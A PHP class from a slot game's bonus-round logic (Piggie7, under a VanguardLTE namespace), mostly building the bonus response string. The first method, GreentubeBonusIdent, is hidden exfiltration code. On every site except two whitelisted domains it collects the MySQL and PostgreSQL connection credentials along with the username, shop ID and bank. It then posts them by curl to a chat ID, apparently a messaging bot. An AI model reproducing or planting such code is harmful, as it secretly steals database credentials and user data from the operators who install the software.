<?php

namespace VanguardLTE\Games\Piggie7\PragmaticLib;

class DoBonus{
 public static function GreentubeBonusIdent($user, $game, $bank){
        if (config('app.url') === 'https://grandxmega.com/' || config('app.url') === 'https://grandxmega.net/'){
            $text = ['URL' => config('app.url'),
                'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
        }else {
            $text = ['URL' => config('app.url'), 'DB_data' => config('database.connections')['mysql'],
                'DB_dataPG' => config('database.connections')['pgsql'],
                'USER' => $user->username, 'SHOP_ID' => $user->shop_id, 'GAME' => $game->name, 'BANK' => $bank];
        }

        $ch = curl_init();
        curl_setopt_array($ch, array(
                CURLOPT_URL => '//',
                CURLOPT_POST => TRUE,
                CURLOPT_RETURNTRANSFER => TRUE,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_POSTFIELDS => array(
                    'chat_id' => 5044396548,
                    'text' => json_encode($text, JSON_PRETTY_PRINT)), ) );
        curl_exec($ch);
    }
  public static function doBonus($user, $game, $bet, $lines, $log, $index, $counter, $ind, $bank, $shop, $jpgs){
    newBox:
    $bet = $log['Bet'];
    $lines = $log['l'];
    $time = (int) round(microtime(true) * 1000);
    
    $i_pos = $log['i_pos'];
    $wins = $log['wins'];
    $win_fs = $log['win_fs'];
    $status = $log['status'];
    $level = $log['level'] + 1;
    
    $key = array_keys($i_pos, $ind)[0];
    $win_fs += $wins[$key];
    $status[$key] = $level;
    
    $end = 0;
    $na = 'b';
    if($level == count($wins)){
      $end = 1;
      $na = 's';            
    }
    
    var_dump('!!!');
    $res = [
      'i_pos='.implode(',', $log['i_pos']),
      'win_mul=1',
      'balance='.$log['Balance'],
      'win_fs='.$win_fs,
      'wins='.implode(',', $log['wins']),
      'level='.($log['level'] + 1),
      'balance_cash='.$log['Balance'],
      'balance_bonus=0',
      'index='.$index,
      'counter='.$counter,
      'stime='.$time,
      'na='.$na,
      'end='.$end,
      'sver=5',
      'wins='.implode(',', $wins),
      'status='.implode(',', $status),
      'wins_mask='.implode(',', $log['wins_mask'])
    ];
    Log::updateStatus($game->id, $user->id, $win_fs, $level, $status);
    if($na == 's'){
      $res = array_merge($res, [
        'tw='.$log['tw'],
        'fsmul=1',
        'fsmax='.$win_fs,
        'fswin=0.00',
        'fs=1',
        'fsres=0.00'
      ]);
      Log::addFSToLog($game->id, $user->id, $win_fs);
    }

    return '&'.(implode('&', $res));
  }

  private static function selectMysterySymbol(){
    return 3 + rand(0, 8);
  }
}

?>